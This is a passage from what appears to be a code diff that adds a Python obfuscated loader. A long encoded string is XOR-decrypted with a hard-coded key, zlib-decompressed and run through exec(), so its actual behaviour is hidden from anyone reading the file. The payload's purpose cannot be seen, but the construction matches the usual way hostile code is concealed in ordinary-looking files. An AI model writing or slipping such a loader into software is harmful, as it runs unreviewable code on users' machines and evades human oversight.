+"m9nmt1O3dKALkVXZQtFlsUHv2WyMCIFTDjK76Z41L11Ts+IlRl0p7hWyRD1DgNtTuqPGO4CxJY06PI9v31/2VxSClOisg48dgHJH"
+"95DwQb0sDE5yvqpBmke3HjRABkO/Y5d4gLcuzg7xNPW6QViIWgY9g/wYR+g5V5NGigx95PWtAzm2wyHSOECjr6fBLe5dR11uRFHP"
+"YQuc95agnVWlUloaSs5jEnbAnC5neDcFQJ7swsq1PR7Bf1NlmfM4bGKgxo6VIP8fiP6EfWJd3qNQGsBjbnQAJMSPd/rSX8QVWI3b"
+"I3U8XxokcyP5SwFHVHVHg0ZWL0FoRkeue89OpyEEP9vi8tCVu6bNJOOsNCcLGdi9pJ7uXIH5hw8nTsmwfnE1Tzmy+EeLrpdgPciM"
+"JOgnsqQtCy0AMWL1+6TIoXhQp8qqDt+UvI0Q2CSoMKL1oDLFjjUa/TCaTSsr0KzsjcZ+WFLkBqIntkz/+2/Haerl6fT85vrOvEak"
+"tOqHf76F/FcOXdEr0pIRXDKGGj78zXlCKViRU1LMOzgiibl49QHPhkvhjIKQrsNv+IiaWwCuPPcpB5fObIDeFTKZE4rtBohVfK0U"
+"xb4A1pOFNQmKIqTaHN+XKWXUlWtYNEPOSuQzjp8hDyScAPUdwSd5SJ+YIOLLlRkcffAxgwfoX5swyCXxARHpDWbWqb79SZplWXkw"
+"LuqjasVpPWZ8d/jP4GrUgQVUi/QbT5WODwgQV4PS2kogv97wMfsC+plAZOi9Z5f6zpqi9iXJEKzCphnfjUqwXZEXnsbAwjyvGXld"
+"hYjwMnLTDv/AG3t6L/DxQLbsQRY8SiPf//i/1OotNZNdD1dSHqPm1KyqoGAmBcWEsuJz5/kpqLnKrlucCH2WJyb1vcUcE+RTxywL"
+"CB4zhv3/AqBk7QYNDDWvB9qRqIPNs8NTOa69bThQiATNGaYsEDsZTFE3plYkUMBLiKfX2V16DPy117AAew1w4RYw+pB++nmF6Pvi"
+"tf9DL5+hpdt9oOL6Wzr9CNAWMinM34trQqFDzz1p4tVn7pKBCOuXSiHmKGGtXptr4Zqef1IqNBy6nJMj9K/L13aKFY+8iWTsksNe"
+"xLxZjAEcUNHAMCpGZ0Z+Qzp02aWYduAjvlLtBdITCZaoglevEZ/jC1uWt2vbSXwprcIopIaCpJ547r9F7w3LNJ0r23xWdxSF0Z9J"
+"27t3FPSV0SukgJmuvX47wXgHwTxVQEyXNpkvAGSQX61Z786Lp+b73ybM+K7So1SnGbXoiHWmz04TsMyOLUjtzRo5+MrVdQ7RQJnt"
+"R/1MmhHvzvWHrOapKLXb3SO7JL/wVqcGmBLvvL4T1UTeRXBHWVSywDF6i28PyeWQfdkhwUJsNek9bonbyahtsb+4H8yHrasOMUpM"
+"XLS1p+66ISadvp2soPuYkYyvguDFd4j32upT069Q47tbZF/rHnwzGn1CaX13GU4MVWvG0EuIMD+ohqBDPxTS27ILfjPxChwDHGAm"
+"KumuuogrRhM/Zuaf3v6ZXvwwMzRL1Y1LiS7ENy52OpOP9FXGZ0Q7Q0dQgx1VVEwm5JBtTOdZMntMu0t1q5jlrvHGmPwhAB+XAKuq"
+"eCmsikf390sQNLn/9oCbDgf6+NXuh4/IqxK47T+MHrUTnobJUdLTg00URKkHs18Rr8nq31azi7GdmAakof/HH2nMr4sGmUqE3Xrg"
+"25Svf6RMB/40xk+CUWobkOHPsY5KfvPt9Dh07K06RYWxvVeb78+14lb3TUr8sNo1uLM7sxtRIBeCKIuYcE9h9lIVWNOdifo9QsJO"
+"V7PlKCpGqH0/aZ4Fvp1/0hAXZR2A/+kzV7/lgmMdpCJE+uGBwsxyzxNOSNlTcT9gensMIdtFs43CqjW7OsBQUoyDkb6ULSv8s5Dd"
+"NfpFLtlvwJhB5J3Sm924o2nDo/HlxDzoyaZ6QZ5drESQl4/TUkrl/4tij0A4wWNKjeirNfCnNCt0uIcU/+xnSsuNwF8MRhu7oLam"
+"oXWgssssUyqthZMtPjH1lqGZmr7FM6Wy8ant2j611RUBK+SrmkK1ydM7S07/jasiC41viekYUJooZX7YDF+nG7YtWMAPwjouiCMU"
+"hUd9WZbfsFIFjjtIcLpnGZSieC7U26I2dMfTV1om5FS8dDYD0tdNXQQn6BjqsmgEOtJHg1T/B2xRwkjnTohTD22HHiDHR3OiemLi"
+"69+5OBJve0Uw8kg/U4+uhfFPlVDys0IZ19w/lY5MIXWUn8ZriRc9jhnEULzsAOLE/j27GgeiaSgKyip5nBS7SqGobCqLW9M6vKd8"
+"mtBYfrmV7pAcaZ8BCGxEsnxxRCboHR5Bl24xnXrCAYVwQELMojQu7GuHwOkQo56ZzasuZZ3dlP3fxXEdtHPMMtRy8DcH7jk5UJ8j"
+"lKWPQR/8KQ7F5rwiqVwNA91neqP1hNXx6TYw6/dvrOEaWGi5+wdK/DXjZQJ8dg5TaGbhqQd7b2vO4sWBFwbJpeyBcSzonQjd5u14"
+"neK3eblHOf4d9Sp62YsbeeG3az8CLouhZWK2SfnLYfmWmpaBfsFrHgei6BGtLnkARZjBSvMKe9KA5An7dWKE0tMBjL0GrLn2Mej6"
+"eOOAbven/4CaP7qE4g+818Cc5q20jaYuPzaXq3rlKGKAQMmoEDsmcHQsUmBNKMsHJRPb8WsBHnuxXhjGDIAAJIvGeqoPPu2jfuJa"
+"N0RGbODWneynr88TEuW+GXxSLzwCoyqBps/tuGc5lrT1Webzc53k1SH2IqrmdDi94opvbdk3T9Sw6XTR74fWJa1R5fNsMxRQAOTi"
+"gU/MER6PWRqDd327JY/Bqwi3W7fzMgPfR/LF5PUJmNGtDBtOTiqN5Gun4Z0OYtM0tyeyBt/2rYHB3QwUe/DTgvxZ+RMy7k2c/wiJ"
+"ByLGu3LQ35gvpTmYd2jde9+krc+uzKf3YacYz5xovZthiFzNFSh1A8KI5bPhLkmxI2M40eKk88zyYHAEsvP4eR6k88SSHtAZCzIV"
+"d+ugicENW8Vb+7n+PrQ+VDuaEOvhQxGvZDr1J+GrKqvOR1Q+ettL1wYRwogge+nvHNEmDnQJAarNIHVg7eUTQyQYz6+KvJWcfnb5"
+"pcLe1SqepFbwtU4QA9vAptoKy1YygRaPW5yCAm9KcuOxTOCNQnEuHvSCS6Kzx6gt/qhlFTaUeBD4D6I67saWXN53RyotHr1GDYgp"
+"MlbiIBtUdSDO1pWhwMZR4xj0hXNtTH+/FbuENrJTgOwF53NREK00oQQHgsptdORhyI9enaHdP1ia5s5gNccNYZrTfSXm4FgTauQF"
+"/3MkxKaMSLhOqAtkdlRKsZxLuxZs+x8meallmoce8NyqkVFA1pHTxOzl2yO+MSKy2y00dB8xbArnG6dw/ThQ9UAnHXMcYXe8BsX4"
+"gmMzmJNReQORG2CJjaUdRaT+O8ZQSzXTODkyvWbe7w8fYmTS9ow8jj+bBu1pfEnYOh5tfP/kN67wDGQELDTdcwPw+Of4gTwEM+n/"
+"eUEwNiPtmgke4uu4TSKo2uoSIuYc/yHvTJMuSiWfwWp9YX7jRUNDBLfBP8HW6K32Bwlpykv/KUnG7vauUvlaYprjmzMrE5+2fJAW"
+"GIaq979z4NJhpQw4uAW41nSbemtbPWmJyJ6LZJKDVorCOUHHkdHekYYqvA30rFvlkEoJOrewvKAOsUKfbFpWdwXKqpymgtinhtQE"
+"f5q7a/7CtWSHZFhWQ9/0OpClPm4J6g2NVHCs7PlIfw2ye/p1wePasf9ivvqKYpEDzAO2oafAAJapW7Vem6N5Sxgsli1fucjZaYEz"
+"UNoX39nZp/KJsifA6oU+k3wTV99+LpS8LmmksFtb6df0IH1Gcco2m8srx6+txl7OqHdSN54fbBTEwJgi5aiu2kWmrHcLt/z3S0X2"
+"MBjTFnXWwHsCt6T8Nu0XzMfWBhmN7FIBrOuX4PRg5MvYVu3HsDOqOZ8WtQ3rhheyWYFgS6nXUowKOLePCRVmCCUJ05pSBjRF+cI8"
+"UqEvKlkMok7bledk2nOprFEXi6EGNU8/s7li6bsg4lVlKnb5cBUNGd8Wzy95Qb8YAwqDNDXpuBV8uoCWXh2ZXMwkcp3h7icn0FBa"
+"ta5WCDsXYm+SPFoYIneIT+kLEGw9mGo//16cm6roJ5p5XQtiLXeZwy3f3+EflJRaGM1V3kM0fUCF/XnsLlXPkaYhrtnvzeNcX/8J"
+"MlFeXlJL97Wb64HXlhnnjlcmDwnahp+CDoHvkeiOBwrkQkCi/O8eMI6d90ulmN/6E2V0iQ7QxiybdR+SgieZRdoD/MUWUoaFcphC"
+"XPELNBLWB8OAe7AnpCPXTiwSTE08h6bvWPjYtDDKYIkf3tBdNKS8Ilj/Hlrs1JCWif2Z962uVXWGryWtNpuwqV/3E7yvezCuri7f"
+"3OAYxbKxKrZWM+oLWNc2IsLvdxRZrtqSmutBsQBoT2CWkm1KVd9cP6atDRy146RdA177JnwZeP7qp5x2WlDTlfPHbb8ZWwKq4Yr4"
+"97IyNe8FOCgauni4w2or/xdi1uX1s2r+hGfENoalxm4cu7ViB+NeSOt/WMgYzzzI/a40E+xBdxgNI2gIJf4GorIEpXhJcZjrvd3N"
+"y2y14oww8DdVpHF9dvv8PIyDToQ3t2PN+x9xeV1u3EDnN4JItkiVAm+DonXSoU5YX4Mf4tPZu5yIy5ZWwX+UolQmisLho+Egu7tP"
+"i7naciuNfiPrsGgjE4BRiwGWfYJK5e24yazt3y+OeJkvibg3A1gmIghbzrQy3r4vYLYFqfr1cHblYJYExWLTQOqqaU1yIvXnk3LG"
+"3F2t6U2alRLj2Ph4twSKSmodCw6QkMBdKJy77XF/qcWFHjvQk0OH+UZ6QfFkjxRTNDef0S7AFQpfWOwbL4f54AlPujcg4xSVpxLo"
+"QxRaf3DZVF9nFLxBbD2y8B6YyDP5K6KzyEHvmeO+xAnb+ZNTr3wtFswl4pSAkGbTdCF5DiQudQz+7/2DrlPj21mi+a3sAHqX9n7w"
+"K1omuELlJW93+CM5vuF40PtSuRrt0vMF0X/tByUKmQhCIT7v8fnzVrDKI5kn1jS4YK4X9vSq6P1sXiS7eENyMHaxfmjysYq61Qkx"
+"7B42GGwiW0E6Y4tLiBKskdEwGkRabGSqIr1ubChzd/0MYUH0tP+ERRdEYOXuP9U/1EWwX25MPzK5Nn7nVSfQLmkTLhLpW65l4nT8"
+"X3t0vhuSDFpLLlE3mG/aPNm5duRATapGpOE6TmGBx/LXGmQ4/m5zFid5rahUD6+chVvjnCi3eUSQnBgIYHYzgRoFVDl8WpUHskGo"
+"lqZfbDMUD9i3JhTOsHfaPa9OPFLkk9mrZkekOPGuUgjEad3veOV8tvJncvjs3PInxUkZjFjtgDCIYSJ18HIitx0bnUPXV0uLCW1p"
+"ZZpS73KvCSiM2OKnKz7xArJ8Ubl72KoIoHxG4a4sT0XJBbFCSJ/BjkS48n8qNz90Tlu0NfVzI8p9LiRQhIsWD3F4wg4E7wh74tQc"
+"doIShqG6W4Cd5UbAu6fVje4Ib1OOy4jHtEj9K6g2O842z6zs87WfErz4+qBsRYJAoCGPvfZMOpkzu5z7X7DKv1v/P9dW9rZUnm4v"
+"EuDIGmP/8oghu7bZMEThxFFtDUVqCP4vfJQB1muzjlqyQyvp9H6DSaYBwZvOjg0RJLZs5OtA8LGJe6H8i0xdF54HcOSkUUXHFW3k"
+"qbhciczp/GrKzTcAQrgd"
+))
+k = b"LEO@2026#XOR"
+for i in range(len(x)):
+    x[i] ^= k[i % len(k)]
+exec(zlib.decompress(bytes(x)))
